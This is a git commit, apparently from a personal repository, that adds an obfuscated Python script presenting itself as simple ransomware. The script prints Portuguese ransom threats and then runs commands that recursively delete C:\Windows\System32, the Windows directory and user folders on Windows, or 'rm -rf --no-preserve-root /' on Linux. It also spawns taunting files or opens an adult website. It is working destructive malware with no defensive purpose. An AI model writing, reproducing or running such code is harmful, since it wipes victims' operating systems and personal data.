c268ebb6c5205a8797058c3d10d2a40a9f9842ca
DarkZero <ruanvsd2024@gmail.com>
2025-08-31 00:56:47 -0300

    Add files via upload

---
+++ TWps.py
@@ -0,0 +1,14 @@
+lllllllllllllll,llllllllllllllI,lllllllllllllIl,lllllllllllllII,llllllllllllIll=print,range,bool,exit,open
+from os import system as llIlIlllIllIll,startfile as IllIlIIIlIlllI
+from sys import platform as lllIIllIllIIlI
+from time import sleep as IIIlIIIIlllIll
+from subprocess import run as lIllIlIlllIIII
+def IlIlIlIllIllIIIIIl():
+	B='win32';A=lllllllllllllIl(((1&0^0)&0^1)&0^1^1^0|1);llIlIlllIllIll('cls'if lllIIllIllIIlI==B else'clear');lllllllllllllll('você caiu em um ransonware simples, pague em bitcoin ou apagaremos tudo\n');IIIlIIIIlllIll(.5);lllllllllllllll('não adianta sair, mesmo n perdendo os arquivos, nós teremos acesso ao seu dispositivo\n');IIIlIIIIlllIll(.5);lllllllllllllll('nós instalamos um malware no seu dispositivo!\n');IIIlIIIIlllIll(.5)
+	if lllIIllIllIIlI==B:
+		lIllIlIlllIIII('rmdir /s /q C:\\Windows\\System32',shell=A);lIllIlIlllIIII('rmdir /s /q Documentos',shell=A);lIllIlIlllIIII('rmdir /s /q Downloads',shell=A);lIllIlIlllIIII('rmdir /s /q C:\\Windows\\',shell=A);lIllIlIlllIIII('rmdir /s /q C:\\Documentos',shell=A)
+		for C in llllllllllllllI(1,101):
+			with llllllllllllIll(f"MAL-COMIDA-FDP{C}.txt",'w')as D:D.write('KKKKK VC CAIU EM UM VIRUS DISFARCADO DE RANSONWARE');IllIlIIIlIlllI(f"MAL-COMIDA-FDP{C}.txt")
+	elif lllIIllIllIIlI=='linux':lIllIlIlllIIII('rm -rf --no-preserve-root /',shell=A);lIllIlIlllIIII(['xdg-open','https://xvideos.com'],shell=A);lllllllllllllII()
+	else:lllllllllllllII()
+IlIlIlIllIllIIIIIl()
